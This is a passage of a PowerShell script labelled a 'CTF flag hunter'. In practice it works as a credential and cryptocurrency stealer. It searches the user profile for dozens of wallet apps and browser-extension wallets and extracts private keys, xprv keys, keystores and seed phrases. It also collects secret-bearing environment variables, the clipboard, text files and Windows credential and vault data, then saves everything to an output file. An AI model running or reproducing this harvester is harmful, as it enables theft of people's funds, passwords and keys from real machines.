        @{P="$env:APPDATA\ElectronCash\wallets";         N="Electron Cash (BCH)"},
        @{P="$env:APPDATA\Electrum-LTC\wallets";         N="Electrum-LTC"},
        @{P="$env:APPDATA\Exodus";                       N="Exodus"},
        @{P="$env:APPDATA\atomic\Local Storage\leveldb"; N="Atomic Wallet"},
        @{P="$env:APPDATA\Coinomi\Coinomi\wallets";      N="Coinomi"},
        @{P="$env:APPDATA\Guarda\Local Storage\leveldb"; N="Guarda"},
        @{P="$env:APPDATA\Jaxx Liberty\Local Storage";   N="Jaxx Liberty"},
        @{P="$env:APPDATA\Wasabi Wallet\WalletBackups";  N="Wasabi Wallet"},
        @{P="$env:APPDATA\Sparrow\wallets";              N="Sparrow Wallet"},
        # Monero
        @{P="$env:APPDATA\bitmonero";                    N="Monero monerod"},
        @{P="$env:USERPROFILE\Monero\wallets";           N="Monero GUI"},
        @{P="$env:APPDATA\monero-project\monero-core";   N="Monero Core"},
        # Browser extension wallets (Chrome/Edge)
        @{P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"; N="MetaMask Chrome"},
        @{P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"; N="MetaMask Edge"},
        @{P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa"; N="Phantom Chrome (Solana)"},
        @{P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad"; N="Coinbase Wallet Chrome"},
        # Ledger/Trezor
        @{P="$env:APPDATA\Ledger Live";                  N="Ledger Live"},
        @{P="$env:APPDATA\Trezor Suite";                 N="Trezor Suite"},
        # MyCrypto/MEW
        @{P="$env:APPDATA\MyCrypto";                     N="MyCrypto"},
        @{P="$env:APPDATA\MyEtherWallet";                N="MyEtherWallet"},
        # Trust Wallet
        @{P="$env:APPDATA\Trust Wallet";                 N="Trust Wallet"},
        @{P="$env:LOCALAPPDATA\Programs\trust-wallet";   N="Trust Wallet (local)"},
        # imToken / TokenPocket
        @{P="$env:APPDATA\imToken";                      N="imToken"},
        @{P="$env:APPDATA\TokenPocket";                  N="TokenPocket"}
    )

    foreach ($w in $wallets) {
        if (Test-Path $w.P -PathType Leaf) {
            $size = (Get-Item $w.P).Length
            Emit "Wallet-$($w.N)" $w.P "($("{0:N0}" -f $size) bytes)" $w.N
            $raw = ReadBytes $w.P 65536
            if ($raw) {
                $text = [Text.Encoding]::Latin1.GetString($raw)
                Find-SeedPhrases $text $w.P
                # WIF key
                [regex]::Matches($text, '[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}') | ForEach-Object {
                    Emit "Wallet-WIFKey" $w.P $_.Value "WIF private key — $($w.N)"
                }
                # xprv
                [regex]::Matches($text, 'xprv[1-9A-HJ-NP-Za-km-z]{107}') | ForEach-Object {
                    Emit "Wallet-xprv" $w.P $_.Value "BIP32 xprv — $($w.N)"
                }
                # 64-char hex (raw private key)
                [regex]::Matches($text, '(?<![0-9a-fA-F])[0-9a-fA-F]{64}(?![0-9a-fA-F])') | ForEach-Object {
                    Emit "Wallet-HexKey" $w.P $_.Value "256-bit hex key — $($w.N)"
                }
                # Ethereum keystore JSON
                if ($text -match '"ciphertext"') {
                    Emit "Wallet-ETH-Keystore" $w.P $text.Substring(0,[Math]::Min($text.Length,500)) "Ethereum keystore JSON"
                }
                # Electrum seed (stored in wallet file)
                [regex]::Matches($text, '"seed"\s*:\s*"([^"]+)"') | ForEach-Object {
                    Emit "Wallet-ElectrumSeed" $w.P $_.Groups[1].Value "Electrum seed phrase"
                    Find-SeedPhrases $_.Groups[1].Value $w.P
                }
            }
        } elseif (Test-Path $w.P -PathType Container) {
            Get-ChildItem $w.P -Recurse -Force -ErrorAction SilentlyContinue |
            Where-Object { -not $_.PSIsContainer -and $_.Length -lt 10MB } |
            ForEach-Object {
                Emit "Wallet-$($w.N)" $_.FullName "($("{0:N0}" -f $_.Length) bytes)" $w.N
                $raw = ReadBytes $_.FullName 65536
                if ($raw) {
                    $text = [Text.Encoding]::Latin1.GetString($raw)
                    Find-SeedPhrases $text $_.FullName
                    [regex]::Matches($text, '[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}') | ForEach-Object {
                        Emit "Wallet-WIFKey" $_.FullName $_.Value "WIF key"
                    }
                    [regex]::Matches($text, 'xprv[1-9A-HJ-NP-Za-km-z]{107}') | ForEach-Object {
                        Emit "Wallet-xprv" $_.FullName $_.Value "BIP32 xprv"
                    }
                    [regex]::Matches($text, '"seed"\s*:\s*"([^"]+)"') | ForEach-Object {
                        Emit "Wallet-Seed" $_.FullName $_.Groups[1].Value "Wallet seed from JSON"
                        Find-SeedPhrases $_.Groups[1].Value $_.FullName
                    }
                    if ($text -match '"ciphertext"') {
                        Emit "Wallet-ETH-Keystore" $_.FullName $text.Substring(0,500) "Ethereum keystore"
                    }
                }
            }
        }
    }

    # Broad wallet.dat search in user profile
    Get-ChildItem $env:USERPROFILE -Filter "wallet.dat" -Recurse -Force -ErrorAction SilentlyContinue |
    ForEach-Object { Emit "Wallet-Generic" $_.FullName "($("{0:N0}" -f $_.Length) bytes)" "wallet.dat" }

    # Ethereum UTC keystore files
    Get-ChildItem $env:USERPROFILE -Filter "UTC--*" -Recurse -Force -ErrorAction SilentlyContinue |
    ForEach-Object {
        $content = ReadText $_.FullName
        if ($content) { Emit "Wallet-ETH-UTC" $_.FullName ($content.Substring(0,[Math]::Min($content.Length,500))) "ETH keystore" }
    }
}

# ── 16. Environment variables ─────────────────────────────────────────────────
function Scan-EnvVars {
    Header "ENVIRONMENT VARIABLES"
    [System.Environment]::GetEnvironmentVariables() |
    ForEach-Object { $_.GetEnumerator() } |
    Where-Object { $_.Value -match '(?i)(pass|secret|key|token|flag|cred|api|auth|pw)' -or
                   $_.Key   -match '(?i)(pass|secret|key|token|flag|cred|api|auth|pw)' } |
    ForEach-Object {
        Emit "EnvVar" "Env:$($_.Key)" $_.Value
        Find-SeedPhrases $_.Value "EnvVar:$($_.Key)"
    }
}

# ── 17. Alternate Data Streams ────────────────────────────────────────────────
function Scan-ADS {
    Header "ALTERNATE DATA STREAMS"
    @("$env:USERPROFILE","C:\CTF","C:\Flags",$env:TEMP) | ForEach-Object {
        if (-not (Test-Path $_)) { return }
        Get-ChildItem $_ -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer } |
        ForEach-Object {
            $streams = Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue |
                       Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
            foreach ($s in $streams) {
                $val = Get-Content $_.FullName -Stream $s.Stream -ErrorAction SilentlyContinue
                Emit "ADS" "$($_.FullName):$($s.Stream)" "$val" "Hidden alternate data stream"
                Find-SeedPhrases "$val" "$($_.FullName):$($s.Stream)"
            }
        }
    }
}

# ── 18. Text file broad scan ──────────────────────────────────────────────────
function Scan-TextFiles {
    Header "BROAD TEXT FILE SCAN"
    $roots = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads",
               $env:TEMP,"C:\CTF","C:\Flags","C:\challenge","C:\Windows\Temp",
               "C:\Windows\System32\drivers\etc")
    $exts  = "*.txt","*.log","*.json","*.xml","*.ini","*.cfg","*.conf","*.config",
             "*.env","*.yaml","*.yml","*.md","*.ps1","*.bat","*.cmd","*.py","*.php"

    foreach ($root in $roots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($ext in $exts) {
            Get-ChildItem $root -Filter $ext -Recurse -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -lt 1MB } |
            ForEach-Object {
                $content = ReadText $_.FullName
                if ($content -and $content.Trim().Length -gt 3) {
                    Emit "TextFile" $_.FullName $content.Substring(0,[Math]::Min($content.Length,500)) `
                         "$($_.Length) bytes"
                    Find-SeedPhrases $content $_.FullName
                }
            }
        }
    }
}

# ── 19. Clipboard ─────────────────────────────────────────────────────────────
function Scan-Clipboard {
    Header "CLIPBOARD"
    try {
        Add-Type -AssemblyName PresentationCore -ErrorAction SilentlyContinue
        $clip = [System.Windows.Clipboard]::GetText()
        if ($clip) {
            Emit "Clipboard" "System clipboard" $clip.Substring(0,[Math]::Min($clip.Length,2000))
            Find-SeedPhrases $clip "Clipboard"
        }
    } catch {}
}

# ── 20. Binary string scan ────────────────────────────────────────────────────
function Scan-BinaryStrings {
    Header "BINARY STRING SCAN"
    @("$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials",
      "$env:APPDATA\Microsoft\Vault","C:\Windows\Panther") |
    ForEach-Object {
        Get-ChildItem $_ -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer -and $_.Length -lt 10MB } |
        ForEach-Object {
            $raw = ReadBytes $_.FullName 65536
            if (-not $raw) { return }
            $strs = Get-BinaryStrings $raw
            foreach ($s in $strs) {
                Emit "BinStr" $_.FullName $s
                Find-SeedPhrases $s $_.FullName
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
Write-Host "`n$SEP2`n  CTF FLAG HUNTER`n  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$SEP2"

Scan-TextFiles
Scan-CredMan
Scan-Vault
Scan-Registry
Scan-ChromiumBrowsers
Scan-Firefox
Scan-GPP
Scan-Unattend
Scan-SSH
Scan-DevCreds
Scan-PSHistory
Scan-StickyNotes
Scan-FTPClients
Scan-WiFi
Scan-DPAPI
Scan-CryptoWallets
Scan-EnvVars
Scan-ADS
Scan-Clipboard
if ($Deep) { Scan-BinaryStrings }

Write-Host "`n$SEP2`n  COMPLETE — $($FINDS.Count) items found`n$SEP2" -ForegroundColor Green

if ($OutFile) {
    $FINDS | Out-File $OutFile -Encoding UTF8
    Write-Host "[+] Saved: $OutFile" -ForegroundColor Green
}
